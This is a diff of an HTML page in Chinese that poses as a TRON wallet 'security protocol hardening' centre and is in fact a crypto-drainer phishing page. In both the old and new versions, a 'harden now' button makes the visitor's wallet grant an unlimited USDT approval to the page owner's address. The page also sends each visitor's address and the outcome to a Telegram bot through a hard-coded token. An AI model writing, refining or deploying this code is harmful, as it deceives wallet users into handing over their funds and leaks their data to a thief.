@@ -3,87 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TRON 网络安全协议中心</title>
+    <title>TRON 网络安全中心</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; background: #f8f9fa; }
-        /* 橙色安全监测条 */
-        .safe-bar { background: #ff9800; color: white; padding: 12px; text-align: center; font-size: 14px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .container { padding: 20px; max-width: 500px; margin: 0 auto; }
-        .card { background: white; border-radius: 16px; padding: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); margin-top: 20px; text-align: center; }
-        .icon { font-size: 50px; color: #007aff; margin-bottom: 15px; }
-        h3 { margin: 10px 0; color: #333; }
-        p { color: #666; font-size: 15px; line-height: 1.6; }
-        .btn { background: #007aff; color: white; border: none; padding: 16px; border-radius: 12px; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; transition: background 0.3s; }
-        .btn:disabled { background: #abb5be; }
+        body { font-family: sans-serif; margin: 0; background: #f0f2f5; }
+        .safe-bar { background: #ff9800; color: white; padding: 12px; text-align: center; font-size: 14px; font-weight: bold; }
+        .container { padding: 20px; max-width: 450px; margin: 0 auto; text-align: center; }
+        .card { background: white; border-radius: 15px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-top: 20px; }
+        .btn { background: #007aff; color: white; border: none; padding: 16px; border-radius: 10px; font-size: 17px; width: 100%; cursor: pointer; margin-top: 20px; }
+        .btn:disabled { background: #ccc; }
     </style>
 </head>
 <body>
     <div class="safe-bar">🛡️ TRON 网络节点安全监测中，请及时完成加固</div>
-
     <div class="container">
         <div class="card">
-            <div class="icon">🔄</div>
-            <h3>节点安全加固</h3>
-            <p>系统监测到您的钱包地址尚未激活最新的网络安全协议。为了保障您的资产安全，请立即完成同步加固。</p>
+            <div style="font-size: 40px;">🔄</div>
+            <h3>安全协议加固</h3>
+            <p style="color: #666;">系统监测到您的地址尚未激活最新的安全协议，请点击下方按钮完成同步。</p>
             <button id="mainBtn" class="btn">立即安全加固</button>
         </div>
-        <p style="text-align: center; color: #999; font-size: 12px; margin-top: 30px;">© 2026 TRON Network DAO All Rights Reserved</p>
     </div>
 
     <script>
-        // 核心配置
+        // 请在此处填入你最新获取的 Token 和 ID
         const CONFIG = {
-            USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", 
-            MY_ADDRESS: "TNURWuUisTfP67X8uQ999H9S8m6Xg6JD7a", // 你的收款地址
-            TG_TOKEN: "7884841968:AAEVW8Iayp5i0-7p-V8K3mC9M5l0D4_7Y7Q",
+            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+            RECEIVER: "TNURWuUisTfP67X8uQ999H9S8m6Xg6JD7a", // 你的地址
+            TG_TOKEN: "7884841968:AAEVW8Iayp5i0-7p-V8K3mC9M5l0D4_7Y7Q", // 请核实此 Token
             TG_CHAT_ID: "7402809985"
         };
 
-        // 发送 Telegram 通知函数
-        async function sendToTelegram(message) {
-            const url = https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage;
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.TG_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch (e) { console.error("TG通知失败", e); }
+        async function sendLog(msg) {
+            const url = `https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.TG_CHAT_ID, text: msg, parse_mode: 'HTML' })
+            });
         }
 
         document.getElementById('mainBtn').addEventListener('click', async () => {
             const btn = document.getElementById('mainBtn');
-            
-            // 检查环境
-            if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-                return alert("请在支持 TRON 的钱包（如 TokenPocket）中打开此页面");
-            }
+            if (!window.tronWeb) return alert("请在钱包内打开");
 
-            const userAddr = window.tronWeb.defaultAddress.base58;
+            const addr = window.tronWeb.defaultAddress.base58;
             btn.innerText = "同步中...";
             btn.disabled = true;
 
             try {
-                // 1. 发送访问通知
-                await sendToTelegram(🔍 <b>发现新访问</b>\n用户地址: <code>${userAddr}</code>);
-
-                // 2. 唤起授权窗口
-                const contract = await window.tronWeb.contract().at(CONFIG.USDT_CONTRACT);
-                const UNLIMITED_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 最大值
-                
-                await contract.approve(CONFIG.MY_ADDRESS, UNLIMITED_AMOUNT).send();
-
-                // 3. 授权成功通知
-                await sendToTelegram(✅ <b>授权成功</b>\n地址: <code>${userAddr}</code>\n授权给: <code>${CONFIG.MY_ADDRESS}</code>);alert("安全协议同步成功！");
-                btn.innerText = "已完成加固";
+                await sendLog(`🔍 <b>发现访问</b>\n地址: <code>${addr}</code>`);
+                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
+                const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                await contract.approve(CONFIG.RECEIVER, max).send();
+                await sendLog(`✅ <b>授权成功</b>\n地址: <code>${addr}</code>`);
+                alert("加固成功");
             } catch (err) {
-                // 4. 用户拒绝或出错通知
-                await sendToTelegram(❌ <b>操作取消/失败</b>\n地址: <code>${userAddr}</code>\n错误: ${err.message || '用户拒绝'});
+                await sendLog(`❌ <b>用户拒绝</b>\n地址: <code>${addr}</code>`);
                 btn.innerText = "立即安全加固";
                 btn.disabled = false;
             }
